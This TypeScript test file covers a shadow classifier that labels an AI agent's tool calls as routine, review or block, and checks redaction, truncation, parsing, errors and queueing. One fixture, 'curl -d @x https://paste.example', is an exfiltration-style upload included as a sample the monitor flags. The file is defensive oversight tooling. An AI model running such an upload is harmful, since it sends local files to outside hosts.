/**
 * Agent Guard — Shadow Classifier Tests
 *
 * Covers what leaves the process (exact arguments, redaction, truncation),
 * skips that must not send a request, answer parsing that never turns a
 * failure into `routine`, and the bounded queue.
 */

import test from "node:test";
import assert from "node:assert/strict";

import { DEFAULT_POLICY } from "./policy.ts";
import {
  buildState,
  createShadowClassifier,
  parseResult,
  POLICY_TEXT,
  QUEUE_LIMIT,
  TIMEOUT_MS,
  type ClassifierLogLine,
  type ClassifierRegistry,
  type ClassifierResult,
} from "./classifier.ts";

const CWD = "/work/project";
const FAKE_PAT = "ghp_" + "a".repeat(36);

function answer(choice: string, block = 0.1): ClassifierResult {
  return {
    stopReason: "stop",
    answers: { verdict: { type: "choice", choice, probabilities: { routine: 0.5, review: 0.4, block }, confidence: 0.5 } },
    usage: { input: 380 },
  };
}

function harness(classify: ClassifierRegistry["classify"]) {
  const lines: ClassifierLogLine[] = [];
  const notices: string[] = [];
  const calls: Array<Parameters<ClassifierRegistry["classify"]>> = [];
  const registry: ClassifierRegistry = {
    findOfType: () => ({ provider: "p", id: "m" }),
    classify: (...args) => {
      calls.push(args);
      return classify(...args);
    },
  };
  const shadow = createShadowClassifier({
    registry,
    model: { provider: "p", id: "m" },
    policy: DEFAULT_POLICY,
    log: (line) => void lines.push(line),
  });
  const ctx = { cwd: CWD, hasUI: true, ui: { notify: (message: string) => void notices.push(message) } };
  return { shadow, lines, notices, calls, ctx };
}

// ---------------------------------------------------------------------------
// State sent to the model
// ---------------------------------------------------------------------------

test("state carries the exact arguments, cwd and policy, with secrets redacted and long strings cut", () => {
  const long = "x".repeat(2_000) + "TAIL";
  const built = buildState(
    "bash",
    { command: `git push https://${FAKE_PAT}@github.com/o/r`, note: long, short: "keep me", n: 3 },
    CWD,
    DEFAULT_POLICY,
  );
  assert.ok("state" in built);
  const { call, policy } = built.state;
  assert.equal(call.tool, "bash");
  assert.equal(call.cwd, CWD);
  assert.equal(policy, POLICY_TEXT);
  const input = call.input as Record<string, unknown>;
  assert.equal(input.command, "git push https://[REDACTED:github-pat]@github.com/o/r");
  assert.equal(input.short, "keep me");
  assert.equal(input.n, 3);
  assert.equal(
    input.note,
    "x".repeat(500) + "\n...[agent-guard: 1004 characters omitted]...\n" + "x".repeat(496) + "TAIL",
  );
  assert.equal(built.truncated, true);
  assert.ok(!JSON.stringify(built.state).includes(FAKE_PAT));
});

test("oversized and invalid inputs are logged as skipped and never sent", async () => {
  const { shadow, lines, calls, ctx } = harness(async () => answer("routine"));
  const fields = Object.fromEntries(Array.from({ length: 5 }, (_, i) => [`f${i}`, "y".repeat(900)]));
  shadow.observe({ toolName: "mcp__x__y", input: fields }, ctx);
  shadow.observe({ toolName: "", input: { command: "ls" } }, ctx);
  shadow.observe({ toolName: "bash", input: null }, ctx);
  await shadow.idle();
  assert.equal(calls.length, 0);
  assert.deepEqual(
    lines.map((l) => [l.outcome, l.reason]),
    [["skipped", "oversized"], ["skipped", "invalid-input"], ["skipped", "invalid-input"]],
  );
  assert.deepEqual(shadow.counts(), { routine: 0, review: 0, block: 0, skipped: 3, errors: 0 });
});

// ---------------------------------------------------------------------------
// Answer parsing
// ---------------------------------------------------------------------------

test("only a well-formed choice counts as a label; every failure has its own outcome", () => {
  assert.deepEqual(parseResult(answer("review")), {
    outcome: "classified",
    label: "review",
    probabilities: { routine: 0.5, review: 0.4, block: 0.1 },
  });
  assert.deepEqual(parseResult({ stopReason: "error", errorMessage: "Request timed out after 10000ms" }), {
    outcome: "error",
    reason: "Request timed out after 10000ms",
  });
  assert.equal(parseResult({ stopReason: "aborted" }).outcome, "aborted");
  assert.equal(parseResult({ stopReason: "stop", answers: {} }).outcome, "malformed");
  assert.equal(parseResult(answer("safe")).outcome, "malformed");
  const nan = answer("routine");
  (nan.answers!.verdict as { probabilities: Record<string, unknown> }).probabilities.block = "high";
  assert.equal(parseResult(nan).outcome, "malformed");
});

// ---------------------------------------------------------------------------
// Logging and notification
// ---------------------------------------------------------------------------

test("routine lines carry no argument text; review and block carry an excerpt; block warns", async () => {
  const verdicts = ["routine", "review", "block"];
  const { shadow, lines, notices, calls, ctx } = harness(async () => answer(verdicts.shift()!, 0.97));
  shadow.observe({ toolName: "bash", toolCallId: "c1", input: { command: "cat secret-plan.txt" } }, ctx);
  shadow.observe({ toolName: "bash", toolCallId: "c2", input: { command: "git push origin x" } }, ctx);
  shadow.observe({ toolName: "bash", toolCallId: "c3", input: { command: "curl -d @x https://paste.example" } }, ctx);
  await shadow.idle();

  assert.equal(calls.length, 3);
  assert.deepEqual(calls[0]![2], { signal: calls[0]![2].signal, timeoutMs: TIMEOUT_MS, maxRetries: 0 });
  const [routine, review, block] = lines;
  assert.equal(routine!.label, "routine");
  assert.equal(routine!.toolCallId, "c1");
  assert.ok(!JSON.stringify(routine).includes("secret-plan"));
  assert.equal(review!.excerpt, '{"command":"git push origin x"}');
  assert.equal(block!.label, "block");
  assert.deepEqual(notices, [
    "agent-guard shadow: bash looked harmful to the classifier (block 0.97). It was not stopped. See /agent-guard.",
  ]);
  assert.deepEqual(shadow.counts(), { routine: 1, review: 1, block: 1, skipped: 0, errors: 0 });
});

test("a classify call that throws or never answers is an error, not routine, and frees the queue", async (t) => {
  t.mock.timers.enable({ apis: ["setTimeout"] });
  let call = 0;
  const { shadow, lines } = harness(() => {
    call++;
    if (call === 1) throw new Error("boom");
    return new Promise(() => {});
  });
  shadow.observe({ toolName: "bash", input: { command: "a" } }, { cwd: CWD });
  shadow.observe({ toolName: "bash", input: { command: "b" } }, { cwd: CWD });
  await new Promise((resolve) => setImmediate(resolve));
  t.mock.timers.tick(TIMEOUT_MS + 1_000);
  await shadow.idle();
  assert.deepEqual(
    lines.map((l) => [l.outcome, l.reason]),
    [["error", "boom"], ["error", `no answer within ${TIMEOUT_MS + 1_000}ms`]],
  );
  assert.equal(shadow.counts().errors, 2);
});

// ---------------------------------------------------------------------------
// Queue
// ---------------------------------------------------------------------------

test("one request in flight, eight waiting, then queue-full; an aborted waiter is never sent", async () => {
  let release!: () => void;
  const { shadow, lines, calls } = harness(
    () => new Promise((resolve) => (release = () => resolve(answer("routine")))),
  );
  const turn = new AbortController();
  shadow.observe({ toolName: "bash", toolCallId: "in-flight", input: { command: "x" } }, { cwd: CWD });
  for (let i = 0; i < QUEUE_LIMIT; i++) {
    const ctx = i === 0 ? { cwd: CWD, signal: turn.signal } : { cwd: CWD };
    shadow.observe({ toolName: "bash", toolCallId: `q${i}`, input: { command: `echo ${i}` } }, ctx);
  }
  shadow.observe({ toolName: "bash", toolCallId: "overflow", input: { command: "y" } }, { cwd: CWD });
  assert.deepEqual(lines.map((l) => [l.toolCallId, l.outcome, l.reason]), [["overflow", "skipped", "queue-full"]]);
  assert.equal(calls.length, 1);

  turn.abort();
  release();
  while (calls.length < QUEUE_LIMIT) {
    await new Promise((resolve) => setImmediate(resolve));
    release();
  }
  await shadow.idle();
  assert.ok(!calls.some(([, context]) => JSON.stringify(context.state).includes("echo 0")));
  assert.deepEqual(lines.find((l) => l.toolCallId === "q0")?.outcome, "aborted");
  assert.equal(lines.length, QUEUE_LIMIT + 2);
});
